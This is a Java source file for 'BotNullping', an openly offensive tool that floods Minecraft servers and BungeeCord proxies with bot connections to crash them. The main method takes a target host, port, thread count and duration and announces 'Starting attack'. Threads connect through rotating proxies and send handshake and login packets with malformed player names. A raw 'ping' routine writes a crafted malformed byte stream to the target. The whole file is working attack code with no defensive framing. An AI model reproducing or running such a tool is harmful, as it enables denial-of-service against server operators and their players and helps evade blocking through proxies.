package me.nzxter.botnullping;

import java.awt.Color;
import java.io.ByteArrayInputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.net.InetSocketAddress;
import java.net.Proxy;
import java.net.Socket;
import java.net.SocketImpl;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.security.spec.InvalidKeySpecException;
import java.util.Random;
import java.util.UUID;
import java.util.concurrent.TimeUnit;

import javax.crypto.BadPaddingException;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;

import me.nzxter.botnullping.ProxyManager.SocksType;

public class BotNullping {
	private static final ProxyManager proxyManager = new ProxyManager();

	private static Random random = new Random();

	public static int threads = 0;
	public static int number = 0;
	
	public static void pingBytes(int n) {
		number = n;
	}

	public static void main(String[] args) {
		if (args.length == 4) {
			try {
				BotNullping.pingThreadCrasher(args[0], Integer.valueOf(args[1]), Integer.valueOf(args[2]),
						Integer.valueOf(args[3]));
			} catch (NumberFormatException | InterruptedException e) {
			}
		} else {
			System.out.println("By NzxterMC / MHF_TikTok / M.F");
			System.out.println();
			System.out.println("java -jar botnullping.jar <host> <port> <threads> <time>");
			System.out.println();
			System.out.println("Working for Proxys/BungeeCord and Server");
		}
	}

	public static void pingThreadCrasher(String host, int port, int maxThreads, long time) throws InterruptedException {
		System.out.println();
		System.out.println("-------------------------");
		System.out.println("Starting attack");
		System.out.println();
		System.out.println("Host: " + host);
		System.out.println("Port: " + port);
		System.out.println("Threads: " + maxThreads);
		System.out.println("Time: " + time);
		System.out.println("-------------------------");
		System.out.println();

		Thread.sleep(3000);

		time = TimeUnit.SECONDS.toMillis(time);
		long time1 = System.currentTimeMillis();

		do {
			if (threads < maxThreads) {
				new Thread() {

					@Override
					public void run() {
						++threads;
						try {
							BotNullping.pingBytes(number + 1);

							BotNullping.botjoiner(host, port);

							System.out.println("New #" + number);
						} catch (Exception exception) {
						}
						try {
							BotNullping.pingBytes(number + 1);

							BotNullping.ping(host, port);

							System.out.println("New #" + number);
						} catch (Exception exception) {
						}
						--threads;
					}
				}.start();
			}
		} while ((System.currentTimeMillis() - time1) < time);

		System.out.println();
		System.out.println("Starting attack stopped");
		System.out.println();

		System.exit(0);
	}
	
	public static void botjoiner(String host, int port)
			throws NoSuchFieldException, SecurityException, IllegalArgumentException, IllegalAccessException,
			NoSuchMethodException, InvocationTargetException, IOException, InterruptedException {

			Proxy proxy = proxyManager.nextProxy();
			
			Socket socket = new Socket(proxy);
		
			System.out.println("Proxy: " + proxy.address());
	
			socket.connect(new InetSocketAddress(host, port));
			
	        Thread.sleep(1000L);
			
			DataOutputStream out = new DataOutputStream(socket.getOutputStream());

			PacketUtils.sendPacket(PacketUtils.createHandshakeMessage18(host, port, 2), out);

			if (random.nextBoolean()) {
				PacketUtils.sendPacket(PacketUtils.createLogin("" + random.nextInt(-1)), out);

			} else {

				if (random.nextBoolean()) {
					PacketUtils.sendPacket(PacketUtils.createLogin(" "), out);

				} else {

					if (random.nextBoolean()) {
						PacketUtils.sendPacket(PacketUtils.createLogin("abcdefghijklmnopqrstuvwxyz123456789"), out);

					} else {

						if (random.nextBoolean()) {
							PacketUtils.sendPacket(PacketUtils.createLogin(
									"Ã˜Â¨Ã™ï¿½Ã™ï¿½Ã™ï¿½Ã™ï¿½Ã™Å½Ã™Å½Ã™ï¿½Ã™ï¿½Ã™ï¿½Ã™ï¿½Ã™â€˜Ã™â€˜Ã™â€˜Ã™â€™Ã˜Â±Ã™ï¿½Ã™ï¿½Ã™ï¿½Ã™ï¿½Ã™Å½Ã™Å½Ã™ï¿½Ã™ï¿½Ã™ï¿½Ã™ï¿½Ã™â€˜Ã™â€˜Ã™â€˜Ã™â€™Ã˜Â¢Ã™ï¿½Ã™ï¿½Ã™ï¿½Ã™Å½Ã™ï¿½Ã™â€˜ Ã°Å¸â€¡Â®Ã°Å¸â€¡Â¹Ã˜Â¨Ã™ï¿½Ã™ï¿½Ã™ï¿½Ã™ï¿½Ã™Å½Ã™Å½Ã™ï¿½Ã™ï¿½Ã™ï¿½Ã™ï¿½Ã™â€˜Ã™â€˜Ã™â€˜Ã™â€™Ã˜Â±Ã™ï¿½Ã™ï¿½Ã™ï¿½Ã™ï¿½Ã™Å½Ã™Å½Ã™ï¿½Ã™ï¿½Ã™ï¿½Ã™ï¿½Ã™â€˜Ã™â€˜Ã™â€˜Ã™â€™Ã˜Â¢Ã™ï¿½Ã™ï¿½Ã™ï¿½Ã™Å½Ã™ï¿½Ã™â€˜Ã°Å¸â€¡Â®Ã°Å¸â€¡Â¹"),
									out);
						}
					}
				}
			}
	        socket.close();
		}
	

	public static void ping(String host, int port) throws IOException, InterruptedException {
		Proxy proxy = proxyManager.nextProxy();

		Socket socket = new Socket(proxy);
	
		System.out.println("Proxy: " + proxy.address());

		socket.connect(new InetSocketAddress(host, port));
		
        Thread.sleep(1000L);
		
		DataOutputStream out = new DataOutputStream(socket.getOutputStream());
		
		out.write(-71);
		for (int i = 0; i < 1900; ++i) {
			out.write(1);
			out.write(0);
		}
	
		System.out.println("Bytes: " + out.size());
	}
}

